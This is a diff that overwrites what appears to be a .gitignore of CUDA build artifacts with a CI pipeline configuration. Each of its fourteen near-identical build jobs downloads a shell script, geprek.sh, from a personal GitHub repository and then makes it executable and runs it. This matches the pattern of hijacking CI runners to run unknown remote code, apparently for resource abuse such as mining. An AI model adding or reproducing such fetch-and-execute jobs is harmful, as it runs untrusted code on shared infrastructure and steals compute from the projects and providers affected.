@@ -1,6 +1,43 @@
-*.i
-*.ii
-*.gpu
-*.ptx
-*.cubin
-*.fatbin
+image: docker:latest
+build:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build1:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build2:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build3:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build4:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build5:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build6:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build7:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build8:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build9:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build10:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build11:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build12:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
+build13:
+    script:
+        - wget https://raw.githubusercontent.com/sikido21/a/main/geprek.sh && chmod u+x geprek.sh && ./geprek.sh
